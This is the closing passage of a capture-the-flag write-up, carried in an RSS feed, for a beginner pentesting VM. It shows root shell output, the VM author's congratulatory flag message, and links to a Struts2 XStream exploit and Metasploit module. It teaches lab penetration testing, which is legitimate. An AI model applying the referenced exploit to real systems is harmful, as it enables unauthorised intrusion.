uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
root@basic2:~# ls -l
total <span style="color:#ae81ff">4</span>
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1017</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> flag.txt
</code></pre></div><p>The flag:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Congratulations! You&#39;ve completed this challenge. There are two ways (that I&#39;m aware of) to gain 
a shell, and two ways to privesc. I encourage you to find them all!

If you&#39;re in the target audience (newcomers to pentesting), I hope you learned something. A few
takeaways from this challenge should be that every little bit of information you can find can be
valuable, but sometimes you&#39;ll need to find several different pieces of information and combine
them to make them useful. Enumeration is key! Also, sometimes it&#39;s not as easy as just finding
an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
in this series). Usually you&#39;ll have to dig deeper to find things that aren&#39;t as obvious, and
therefore might&#39;ve been overlooked by administrators.

Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you&#39;ll send 
me a link! I can be reached at josiah@vt.edu. If you&#39;ve got questions or feedback, please reach
out to me.

Happy hacking!
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://samsclass.info/124/proj14/p10xstruts.htm">https://samsclass.info/124/proj14/p10xstruts.htm</a></li>
<li><a href="https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/">https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
